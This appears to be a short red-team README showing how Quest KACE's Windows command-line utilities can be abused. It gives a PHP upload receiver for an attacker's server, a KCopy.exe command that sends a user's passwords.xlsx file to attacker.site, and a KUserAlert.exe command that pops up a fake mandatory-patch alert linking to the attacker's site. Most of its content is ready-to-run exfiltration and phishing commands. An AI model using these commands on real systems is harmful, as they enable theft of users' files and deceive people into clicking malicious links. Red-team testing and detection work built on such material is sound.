# kace-abuse
Using KACE (Quest) Windows utilities for Red Teaming.

Two examples of abusing KACE command line utilities.  The first example leverages `KCopy.exe` to upload a file to a remote web server through HTTP PUT.  The second example leverages `KUserAlert.exe` to produce a popup alert on the user's desktop, prompting them to click on a malicious link.

**Uploading a file**<br />
Create an upload page on your attacking web server to receive the file.  This example uses PHP `recv_file.php`.

```php
<?php
$fl = fopen('/php_upload_path/recv_file.out', 'w');
$pd = fopen("php://input", "r");
while ($d = fread($pd, 1024))
   fwrite($fl, $d);
fclose($fl);
fclose($pd);
?>
```

Execute the KACE utility to upload a file.

`"C:\Program Files (x86)\Quest\KACE\KCopy.exe" %USERPROFILE%\Documents\passwords.xlsx https://attacker.site/recv_file.php`

![alt text](https://github.com/billchaison/kace-abuse/blob/main/k00.png)

**Creating a popup message**<br />

`"C:\Program Files (x86)\Quest\KACE\KUserAlert.exe" -name="IMPORTANT MESSAGE" -message="Your computer is missing critical security updates.  Click here to install them as soon as possible, https://attacker.site" -title="Mandatory Software Patches Required" -ok`

![alt text](https://github.com/billchaison/kace-abuse/blob/main/k01.png)

![alt text](https://github.com/billchaison/kace-abuse/blob/main/k02.png)


